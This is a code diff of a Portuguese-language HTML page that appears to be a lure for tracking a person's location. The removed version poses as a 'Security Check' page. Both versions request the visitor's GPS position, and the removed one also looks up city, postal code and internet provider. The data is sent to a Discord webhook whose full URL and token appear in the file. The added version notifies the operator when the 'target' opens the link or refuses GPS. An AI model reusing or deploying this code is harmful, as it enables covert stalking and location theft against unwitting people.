@@ -2,83 +2,52 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
-    <style>
-        body { background: #0b0f19; color: #f1f5f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; text-align: center; }
-        .spinner { border: 4px solid #21262d; border-top: 4px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .toast { position: fixed; top: 10px; right: 10px; background: #3b82f6; color: white; padding: 10px; border-radius: 5px; font-size: 12px; }
-    </style>
+    <title>Processando...</title>
 </head>
-<body>
-    <div id="t"></div>
-    <div class="card">
-        <div class="spinner"></div>
-        <p>Validando conexão segura...</p>
-    </div>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+    <div id="status">INICIANDO PROTOCOLO...</div>
 
     <script>
-        // SUA URL NOVA
-        const URL = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
+        // VERIFIQUE SE ESTE LINK ESTÁ EXATAMENTE IGUAL AO DO DISCORD
+        const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
 
-        function msg(txt) {
-            const d = document.createElement('div');
-            d.className = 'toast'; d.innerText = txt;
-            document.getElementById('t').appendChild(d);
-            setTimeout(() => d.remove(), 2000);
-        }
-
-        async function enviar(dados) {
-            await fetch(URL, {
+        async function enviar(msg) {
+            await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🚨 LOG DE ACESSO DETECTADO",
-                        color: 5763719,
-                        fields: [
-                            { name: "🏙️ Cidade/Estado:", value: dados.local || "Buscando...", inline: true },
-                            { name: "📮 Cep:", value: dados.cep || "N/A", inline: true },
-                            { name: "📍 Localização:", value: `https://www.google.com/maps?q=${dados.lat},${dados.lon}`, inline: false },
-                            { name: "🌐 Provedor:", value: dados.prov || "N/A", inline: false },
-                            { name: "⏰ Horário:", value: new Date().toLocaleString('pt-BR'), inline: false }
-                        ]
-                    }]
-                })
+                body: JSON.stringify({ content: msg })
             });
-            // FECHA A ABA OU REDIRECIONA
-            window.location.href = "about:blank"; 
         }
 
-        window.onload = () => {
-            msg("Iniciando...");
+        window.onload = async () => {
+            // TESTE 1: Manda um aviso assim que abre (pra saber se o link tá vivo)
+            try {
+                await enviar("🚀 **SISTEMA ONLINE:** Alvo abriu o link agora.");
+                document.getElementById('status').innerHTML += "<br>TESTE 1: OK";
+            } catch(e) {
+                document.getElementById('status').innerHTML += "<br>ERRO NO WEBHOOK: " + e;
+            }
+
+            // TESTE 2: Tenta o GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (p) => {
-                    msg("Localizado!");
                     const lat = p.coords.latitude;
                     const lon = p.coords.longitude;
+                    
+                    const log = `🎯 **LOCALIZAÇÃO ENCONTRADA!**\n` +
+                                `📍 Mapa: https://www.google.com/maps?q=${lat},${lon}\n` +
+                                `⏰ Hora: ${new Date().toLocaleString('pt-BR')}`;
+                    
+                    await enviar(log);
+                    document.getElementById('status').innerHTML += "<br>TESTE 2: GPS ENVIADO";
+                    
+                    // Fecha a aba após 2 segundos de sucesso
+                    setTimeout(() => { window.location.href = "about:blank"; }, 2000);
 
-                    try {
-                        // Tenta pegar a cidade real rápido
-                        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-                        const d = await r.json();
-                        const ipR = await fetch('https://ipapi.co/json/').then(res => res.json());
-
-                        await enviar({
-                            lat: lat, lon: lon,
-                            local: `${d.address.city || d.address.town}, ${d.address.state}`,
-                            cep: d.address.postcode,
-                            prov: ipR.org
-                        });
-                    } catch (e) {
-                        // Se a busca da cidade travar, envia só as coordenadas para não perder o log
-                        await enviar({ lat: lat, lon: lon, local: "Erro na tradução (veja o mapa)", prov: "IP Independente" });
-                    }
-                }, () => {
-                    window.location.href = "https://google.com";
-                }, { enableHighAccuracy: true, timeout: 5000 });
+                }, (err) => {
+                    enviar("❌ O alvo recusou o GPS ou o dispositivo bloqueou.");
+                    document.getElementById('status').innerHTML += "<br>ERRO: GPS NEGADO";
+                }, { enableHighAccuracy: true, timeout: 10000 });
             }
         };
     </script>
